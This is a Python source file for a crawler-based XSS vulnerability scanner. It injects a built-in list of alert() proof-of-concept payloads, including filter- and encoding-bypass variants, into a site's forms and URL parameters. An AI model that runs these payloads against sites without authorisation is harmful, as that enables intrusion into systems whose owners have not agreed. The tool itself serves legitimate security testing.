#!/usr/bin/env python3
"""
Professional XSS Scanner Tool
A comprehensive XSS vulnerability scanner with context-aware payload injection
"""

import argparse
import json
import logging
import os
import sys
import time
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Set, Tuple, Optional
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from tqdm import tqdm
import random
from fake_useragent import UserAgent

# Import advanced modules
from advanced_reconnaissance import AdvancedReconnaissance
from poc_capture import PoCCapture
from character_filter_analyzer import CharacterFilterAnalyzer
from context_analyzer import ContextAnalyzer
from vulnerability_detector import VulnerabilityDetector
from report_generator import ReportGenerator
from live_progress import live_progress
from context_breakdown import ContextBreakdown

# Initialize colorama for cross-platform colored output
init(autoreset=True)

class XSSScanner:
    """Professional XSS Scanner with advanced reconnaissance and payload injection"""
    
    def __init__(self, target_url: str, options: Dict):
        self.target_url = target_url
        self.options = options
        self.session = requests.Session()
        self.discovered_urls = set()
        self.vulnerabilities = []
        self.payloads = self._load_payloads()
        self.ua = UserAgent()
        
        # Initialize advanced modules
        self.advanced_recon = AdvancedReconnaissance(target_url, options)
        self.poc_capture = PoCCapture(options)
        self.filter_analyzer = CharacterFilterAnalyzer(self.session)
        self.context_analyzer = ContextAnalyzer()
        self.vuln_detector = VulnerabilityDetector()
        self.report_generator = ReportGenerator()
        self.context_breakdown = ContextBreakdown()
        
        # Setup logging
        self._setup_logging()
        
        # Configure session
        self._configure_session()
        
    def _setup_logging(self):
        """Setup logging configuration"""
        log_level = logging.DEBUG if self.options.get('verbose', False) else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('xss_scanner.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def _configure_session(self):
        """Configure HTTP session with headers and settings"""
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Set timeout
        self.session.timeout = self.options.get('timeout', 10)
        
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load XSS payloads organized by context"""
        return {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
                '<object data="javascript:alert(1)"></object>',
                '<embed src="javascript:alert(1)">',
                '<form><button formaction="javascript:alert(1)">X</button>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<iframe src="javascript:alert(1)"></iframe>'
            ],
            'encoding_bypass': [
                '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;',
                '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
                '\x3Cscript\x3Ealert\x28\x22XSS\x22\x29\x3C\x2Fscript\x3E',
                '\\x3Cscript\\x3Ealert\\x28\\x22XSS\\x22\\x29\\x3C\\x2Fscript\\x3E',
                '\\u003Cscript\\u003Ealert\\u0028\\u0022XSS\\u0022\\u0029\\u003C\\u002Fscript\\u003E'
            ],
            'context_specific': {
                'html': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>'
                ],
                'attribute': [
                    '" onmouseover="alert(\'XSS\')" x="',
                    "' onmouseover='alert(\"XSS\")' x='",
                    '" onfocus="alert(\'XSS\')" autofocus="',
                    "' onfocus='alert(\"XSS\")' autofocus='"
                ],
                'javascript': [
                    ';alert("XSS");',
                    '";alert("XSS");//',
                    "';alert('XSS');//",
                    '`;alert("XSS");//',
                    '${alert("XSS")}',
                    'alert(String.fromCharCode(88,83,83))'
                ],
                'css': [
                    'expression(alert("XSS"))',
                    'url("javascript:alert(\'XSS\')")',
                    'url(javascript:alert("XSS"))',
                    'expression(alert(String.fromCharCode(88,83,83)))'
                ],
                'url': [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    'vbscript:alert("XSS")'
                ]
            }
        }
        
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                    Professional XSS Scanner                    ║
║              Advanced Context-Aware Vulnerability Scanner      ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}Target: {self.target_url}
{Fore.GREEN}Status: Initializing scanner...{Style.RESET_ALL}
"""
        print(banner)
        
    def discover_urls(self) -> Set[str]:
        """Discover all URLs and input points on the target website"""
        print(f"{Fore.CYAN}[INFO] Starting reconnaissance phase...{Style.RESET_ALL}")
        
        discovered = set()
        to_crawl = {self.target_url}
        crawled = set()
        max_depth = self.options.get('depth', 3)
        
        with tqdm(desc="Discovering URLs", unit="URL") as pbar:
            while to_crawl and len(crawled) < self.options.get('max_urls', 100):
                current_url = to_crawl.pop()
                if current_url in crawled:
                    continue
                    
                try:
                    response = self.session.get(current_url, allow_redirects=True)
                    crawled.add(current_url)
                    discovered.add(current_url)
                    pbar.update(1)
                    
                    if response.status_code == 200:
                        # Parse HTML and find links
                        soup = BeautifulSoup(response.content, 'html.parser')
                        
                        # Find all links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urljoin(current_url, href)
                            parsed = urlparse(full_url)
                            
                            if parsed.netloc == urlparse(self.target_url).netloc:
                                if full_url not in crawled and len(crawled) < self.options.get('max_urls', 100):
                                    to_crawl.add(full_url)
                        
                        # Find forms
                        for form in soup.find_all('form'):
                            action = form.get('action', current_url)
                            form_url = urljoin(current_url, action)
                            if form_url not in crawled:
                                to_crawl.add(form_url)
                                
                except Exception as e:
                    self.logger.error(f"Error crawling {current_url}: {e}")
                    continue
                    
        self.discovered_urls = discovered
        print(f"{Fore.GREEN}[SUCCESS] Discovered {len(discovered)} URLs{Style.RESET_ALL}")
        return discovered
        
    def find_input_points(self, url: str) -> List[Dict]:
        """Find all input points (forms, parameters) on a given URL"""
        input_points = []
        
        try:
            response = self.session.get(url)
            if response.status_code != 200:
                return input_points
                
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                form_data = {
                    'type': 'form',
                    'url': url,
                    'action': form.get('action', url),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                        'tag': input_tag.name
                    }
                    form_data['inputs'].append(input_data)
                    
                if form_data['inputs']:
                    input_points.append(form_data)
            
            # Find URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = {}
                for param in parsed_url.query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                        
                if params:
                    input_points.append({
                        'type': 'url_params',
                        'url': url,
                        'params': params
                    })
                    
        except Exception as e:
            self.logger.error(f"Error finding input points for {url}: {e}")
            
        return input_points
        
    def inject_payload(self, input_point: Dict, payload: str) -> Tuple[bool, str]:
        """Inject payload into input point and check for XSS"""
        try:
            if input_point['type'] == 'form':
                return self._test_form_xss(input_point, payload)
            elif input_point['type'] == 'url_params':
                return self._test_url_xss(input_point, payload)
        except Exception as e:
            self.logger.error(f"Error injecting payload: {e}")
            return False, ""
            
    def _test_form_xss(self, form: Dict, payload: str) -> Tuple[bool, str]:
        """Test XSS in form inputs"""
        form_data = {}
        
        for input_field in form['inputs']:
            if input_field['name']:
                if input_field['type'] in ['text', 'email', 'search', 'url', 'textarea']:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field.get('value', '')
        
        if not form_data:
            return False, ""
            
        try:
            # Ensure form action is a full URL
            form_url = form['action']
            if not form_url.startswith(('http://', 'https://')):
                form_url = urljoin(form['url'], form_url)
                
            if form['method'] == 'POST':
                response = self.session.post(form_url, data=form_data)
            else:
                response = self.session.get(form_url, params=form_data)
                
            return self._check_xss_response(response, payload)
            
        except Exception as e:
            self.logger.error(f"Error testing form XSS: {e}")
            return False, ""
            
    def _test_url_xss(self, url_params: Dict, payload: str) -> Tuple[bool, str]:
        """Test XSS in URL parameters"""
        test_params = url_params['params'].copy()
        
        # Test each parameter
        for param_name in test_params.keys():
            test_params[param_name] = payload
            
            try:
                response = self.session.get(url_params['url'], params=test_params)
                is_vulnerable, response_text = self._check_xss_response(response, payload)
                
                if is_vulnerable:
                    return True, f"Parameter: {param_name}\nResponse: {response_text[:500]}"
                    
            except Exception as e:
                self.logger.error(f"Error testing URL XSS: {e}")
                continue
                
            # Reset parameter
            test_params[param_name] = url_params['params'][param_name]
            
        return False, ""
        
    def _check_xss_response(self, response, payload: str) -> Tuple[bool, str]:
        """Check if response contains XSS vulnerability indicators"""
        if response.status_code != 200:
            return False, ""
            
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Check for direct payload reflection
        if payload_lower in response_text:
            return True, response.text
            
        # Check for common XSS indicators
        xss_indicators = [
            '<script>',
            'javascript:',
            'onerror=',
            'onload=',
            'onclick=',
            'onmouseover=',
            'onfocus=',
            'onblur=',
            'onchange=',
            'onsubmit=',
            'onreset=',
            'onselect=',
            'onkeydown=',
            'onkeyup=',
            'onkeypress=',
            'onmousedown=',
            'onmouseup=',
            'onmousemove=',
            'onmouseout=',
            'onmouseover=',
            'onmouseenter=',
            'onmouseleave=',
            'oncontextmenu=',
            'ondblclick=',
            'onwheel=',
            'onabort=',
            'oncanplay=',
            'oncanplaythrough=',
            'ondurationchange=',
            'onemptied=',
            'onended=',
            'onerror=',
            'onloadeddata=',
            'onloadedmetadata=',
            'onloadstart=',
            'onpause=',
            'onplay=',
            'onplaying=',
            'onprogress=',
            'onratechange=',
            'onseeked=',
            'onseeking=',
            'onstalled=',
            'onsuspend=',
            'ontimeupdate=',
            'onvolumechange=',
            'onwaiting='
        ]
        
        for indicator in xss_indicators:
            if indicator in response_text:
                return True, response.text
                
        return False, ""
        
    def scan_target(self):
        """Main scanning function with advanced reconnaissance and live progress"""
        self.print_banner()
        
        try:
            # Phase 1: Advanced Reconnaissance
            live_progress.start_phase("Advanced Reconnaissance", "Comprehensive reconnaissance with live progress tracking")
            recon_results = self.advanced_recon.comprehensive_reconnaissance()
            
            if not recon_results['discovered_urls']:
                live_progress.show_error("No URLs discovered. Exiting.")
                return
                
            # Phase 2: Context Breakdown Analysis
            live_progress.start_phase("Context Breakdown Analysis", "Analyzing input points by context")
            context_breakdown = self.context_breakdown.analyze_input_points(recon_results['input_points'])
            
            # Phase 3: Character Filter Analysis (Optimized)
            live_progress.start_phase("Character Filter Analysis", "Analyzing character filtering mechanisms with parallel processing")
            filter_analysis = {}
            
            for input_point in recon_results['input_points']:
                if input_point['type'] in ['form', 'url_params']:
                    analysis = self.filter_analyzer.analyze_character_filters(
                        input_point['url'], input_point
                    )
                    filter_analysis[f"{input_point['url']}#{input_point.get('type', 'unknown')}"] = analysis
                    
            # Phase 4: Context-Aware Vulnerability Testing
            live_progress.start_phase("Context-Aware Vulnerability Testing", "Testing XSS vulnerabilities with live Chrome demonstration")
            
            total_tests = len(recon_results['input_points']) * 20  # Estimate
            with tqdm(total=total_tests, desc="Testing XSS vulnerabilities") as pbar:
                for input_point in recon_results['input_points']:
                    # Get context analysis
                    context_key = f"{input_point['url']}#{input_point.get('type', 'unknown')}"
                    context_info = recon_results['context_analysis'].get(context_key, {})
                    
                    # Get filter analysis
                    filter_info = filter_analysis.get(context_key, {})
                    
                    # Generate context-specific payloads
                    if context_info.get('suggested_payloads'):
                        payloads = context_info['suggested_payloads']
                    else:
                        payloads = self.payloads['basic'][:5]
                        
                    # Add bypass payloads if filters detected
                    if filter_info.get('bypass_techniques'):
                        for technique_payloads in filter_info['bypass_techniques'].values():
                            payloads.extend(technique_payloads[:3])
                            
                    # Test payloads
                    for payload in payloads[:10]:  # Limit to 10 payloads per input point
                        is_vulnerable, response = self.inject_payload(input_point, payload)
                        if is_vulnerable:
                            # Capture PoC - ONLY proceed if alert is detected
                            poc_data = self.poc_capture.capture_xss_poc(
                                input_point['url'], payload, input_point
                            )
                            
                            # ONLY record vulnerability if PoC capture was successful (alert detected)
                            if poc_data.get('success') and poc_data.get('alert_detected'):
                                self._record_advanced_vulnerability(
                                    input_point, payload, response, context_info, filter_info, poc_data
                                )
                                live_progress.show_vulnerability_found(input_point['url'], payload)
                            else:
                                print(f"❌ No alert detected for {input_point['url']} with payload: {payload}")
                        pbar.update(1)
                        
            # Phase 5: Generate Advanced Reports
            live_progress.start_phase("Generating Advanced Reports", "Creating comprehensive vulnerability reports")
            self._generate_advanced_reports(recon_results, filter_analysis)
            
            # Phase 6: Results
            self._print_advanced_results()
            
        except Exception as e:
            live_progress.show_error(f"Scan failed: {e}")
        finally:
            live_progress.stop()
        
    def _record_vulnerability(self, input_point: Dict, payload: str, response: str, category: str):
        """Record discovered vulnerability"""
        vulnerability = {
            'url': input_point['url'],
            'type': input_point['type'],
            'payload': payload,
            'category': category,
            'response_snippet': response[:1000] if response else '',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        if input_point['type'] == 'form':
            vulnerability['form_action'] = input_point.get('action', '')
            vulnerability['form_method'] = input_point.get('method', '')
            vulnerability['inputs'] = input_point.get('inputs', [])
        elif input_point['type'] == 'url_params':
            vulnerability['parameters'] = input_point.get('params', {})
            
        self.vulnerabilities.append(vulnerability)
        
        print(f"{Fore.RED}[VULNERABILITY FOUND]{Style.RESET_ALL}")
        print(f"URL: {vulnerability['url']}")
        print(f"Type: {vulnerability['type']}")
        print(f"Payload: {payload}")
        print(f"Category: {category}")
        print("-" * 50)
        
    def _print_results(self):
        """Print final results"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                        SCAN RESULTS                        ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}Target URL: {self.target_url}")
        print(f"URLs Discovered: {len(self.discovered_urls)}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}VULNERABILITIES DETECTED:{Style.RESET_ALL}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{Fore.RED}[{i}] {vuln['url']}{Style.RESET_ALL}")
                print(f"Type: {vuln['type']}")
                print(f"Payload: {vuln['payload']}")
                print(f"Category: {vuln['category']}")
                print(f"Timestamp: {vuln['timestamp']}")
        else:
            print(f"\n{Fore.GREEN}No XSS vulnerabilities detected.{Style.RESET_ALL}")
            
        # Save results to file
        self._save_results()
        
    def _save_results(self):
        """Save results to JSON file"""
        results = {
            'target_url': self.target_url,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'urls_discovered': list(self.discovered_urls),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total_urls': len(self.discovered_urls),
                'total_vulnerabilities': len(self.vulnerabilities),
                'vulnerability_types': {}
            }
        }
        
        # Count vulnerability types
        for vuln in self.vulnerabilities:
            vuln_type = vuln['category']
            results['summary']['vulnerability_types'][vuln_type] = \
                results['summary']['vulnerability_types'].get(vuln_type, 0) + 1
                
        filename = f"xss_scan_results_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
            
        print(f"\n{Fore.GREEN}Results saved to: {filename}{Style.RESET_ALL}")
        
    def _record_advanced_vulnerability(self, input_point: Dict, payload: str, response: str, 
                                     context_info: Dict, filter_info: Dict, poc_data: Dict):
        """Record advanced vulnerability with context and PoC"""
        vulnerability = {
            'url': input_point['url'],
            'type': input_point['type'],
            'payload': payload,
            'context_type': context_info.get('context_type', 'unknown'),
            'response_snippet': response[:1000] if response else '',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'confidence': 0.9,
            'severity': 'high',
            'poc_data': poc_data,
            'context_analysis': context_info,
            'filter_analysis': filter_info,
            'evidence': ['Advanced reconnaissance detected XSS vulnerability']
        }
        
        if input_point['type'] == 'form':
            vulnerability['form_action'] = input_point.get('action', '')
            vulnerability['form_method'] = input_point.get('method', '')
            vulnerability['inputs'] = input_point.get('inputs', [])
        elif input_point['type'] == 'url_params':
            vulnerability['parameters'] = input_point.get('params', {})
            
        self.vulnerabilities.append(vulnerability)
        
        print(f"{Fore.RED}[VULNERABILITY FOUND]{Style.RESET_ALL}")
        print(f"URL: {vulnerability['url']}")
        print(f"Type: {vulnerability['type']}")
        print(f"Context: {vulnerability['context_type']}")
        print(f"Payload: {payload}")
        print(f"PoC Screenshot: {poc_data.get('screenshots', {}).get('alert', 'N/A')}")
        print("-" * 50)
        
    def _generate_advanced_reports(self, recon_results: Dict, filter_analysis: Dict):
        """Generate advanced reports with all analysis data"""
        scan_results = {
            'target_url': self.target_url,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'scan_duration': 0,  # Will be calculated
            'total_urls': len(recon_results['discovered_urls']),
            'discovered_urls': list(recon_results['discovered_urls']),
            'vulnerabilities': self.vulnerabilities,
            'reconnaissance_results': recon_results,
            'filter_analysis': filter_analysis,
            'statistics': {
                'total_requests': 0,
                'successful_requests': 0,
                'failed_requests': 0
            }
        }
        
        # Generate comprehensive reports
        reports = self.report_generator.generate_comprehensive_report(scan_results)
        
        print(f"{Fore.GREEN}[SUCCESS] Generated reports:{Style.RESET_ALL}")
        for format_name, filename in reports.items():
            print(f"  {format_name.upper()}: {filename}")
            
    def _print_advanced_results(self):
        """Print advanced results with detailed analysis"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    ADVANCED SCAN RESULTS                    ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}Target URL: {self.target_url}")
        print(f"URLs Discovered: {len(self.discovered_urls)}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}VULNERABILITIES DETECTED:{Style.RESET_ALL}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{Fore.RED}[{i}] {vuln['url']}{Style.RESET_ALL}")
                print(f"Type: {vuln['type']}")
                print(f"Context: {vuln['context_type']}")
                print(f"Payload: {vuln['payload']}")
                print(f"Severity: {vuln['severity']}")
                print(f"Confidence: {vuln['confidence']}")
                print(f"Timestamp: {vuln['timestamp']}")
                
                # Show PoC information
                if vuln.get('poc_data', {}).get('screenshots'):
                    screenshots = vuln['poc_data']['screenshots']
                    print(f"PoC Screenshots:")
                    for screenshot_type, screenshot_path in screenshots.items():
                        if screenshot_path:
                            print(f"  {screenshot_type}: {screenshot_path}")
                            
                # Show context analysis
                if vuln.get('context_analysis'):
                    context = vuln['context_analysis']
                    print(f"Context Analysis:")
                    print(f"  Type: {context.get('context_type', 'unknown')}")
                    print(f"  Encoding: {context.get('encoding_detected', False)}")
                    print(f"  Filters: {context.get('filter_indicators', [])}")
                    
                # Show filter analysis
                if vuln.get('filter_analysis'):
                    filters = vuln['filter_analysis']
                    print(f"Filter Analysis:")
                    print(f"  Filtered Chars: {len(filters.get('filtered_chars', []))}")
                    print(f"  Allowed Chars: {len(filters.get('allowed_chars', []))}")
                    print(f"  Bypass Techniques: {len(filters.get('bypass_techniques', {}))}")
        else:
            print(f"\n{Fore.GREEN}No XSS vulnerabilities detected.{Style.RESET_ALL}")
            
        # Cleanup
        self.poc_capture.cleanup()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Professional XSS Scanner - Advanced Context-Aware Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_scanner.py https://example.com
  python xss_scanner.py https://example.com --depth 5 --max-urls 200
  python xss_scanner.py https://example.com --verbose --timeout 15
        """
    )
    
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('--max-urls', type=int, default=100, help='Maximum URLs to crawl (default: 100)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
        
    options = {
        'depth': args.depth,
        'max_urls': args.max_urls,
        'timeout': args.timeout,
        'verbose': args.verbose
    }
    
    try:
        scanner = XSSScanner(args.target, options)
        scanner.scan_target()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == '__main__':
    main()